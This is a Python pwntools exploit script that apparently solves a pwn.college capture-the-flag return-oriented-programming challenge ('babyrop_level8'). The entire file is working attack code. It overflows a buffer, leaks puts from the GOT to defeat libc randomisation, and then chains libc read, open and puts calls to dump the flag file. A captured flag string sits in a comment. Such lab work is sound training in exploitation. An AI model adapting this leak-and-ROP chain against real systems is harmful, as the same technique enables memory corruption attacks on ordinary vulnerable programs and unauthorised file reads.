#!/usr/bin/env python3
#pwn_college{ANNZNqJ8lt8IDn70lX2v6UtTG4q.dhjNywCN2gzW}
#python3 solution.py


from pwn import *

local = False
#local = True

context.arch = 'amd64'
elf = context.binary = ELF('./babyrop_level8_testing1')
libc = ELF('libc.so.6')

if local:
    p = elf.process()
    raw_input("attach gdb")
else:
    s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
    p = s.process("./babyrop_level8_testing1")

#nop = cyclic(128, n=8)
nop = cyclic_find("haaaaaaa", n=8)

rop = ROP(elf)
rop.call("puts", [elf.got.puts])

#Due to invalid value in rsi the crash was occuring in printf while re-executing the main(), these instructions are just to avoid that crash
rop.raw(0x0000000000401ca1) #pop rsi ; pop r15 ; ret (address in PIE disabled binary)
rop.raw(0x0000000000404018) #value that will be pop'ed in rsi, this is some random value found in GOT section to satisfy the printf criteria, take the static value from puts@glibc in puts@plt
rop.raw(0x00000000000000000) #bogus value that will be pop'ed in r15

rop.raw(0x000000000040101a) #for stack alignment

rop.call("main")
payload = fit({nop : rop.chain()})
print(rop.dump())

p.recvuntil("\n###\n")

p.sendline(payload)
p.recvuntil("Exiting!\n")
puts = p.recvline()
p.recvuntil("\n###\n")

puts = puts.rstrip()
puts = u64(puts.ljust(8, b"\x00"))
print("puts address in GOT in binary: ", hex(puts))
print("static address of puts in libc: ", hex(libc.sym.puts))

libc_base = puts - libc.sym.puts
libc.address = libc_base
print("libc loaded at: ", hex(libc.address))

data_section = 0x404500 # known memory address in data section where flag's filename and later flag content will get copied


rop = ROP(libc)

rop.call("read", [0x00, data_section, 0x08])
rop.call("open", [data_section, 0x00, 0x00])
rop.call("read", [0x03, data_section, 0x40])
rop.call("puts", [data_section])

payload = fit({nop : rop.chain()})
print(rop.dump())

p.sendline(payload)

flag_path = b'flag\x00\x00\x00\x00'
p.sendline(flag_path) # input 'flag' as a filename to store in known location in data_section

p.interactive()

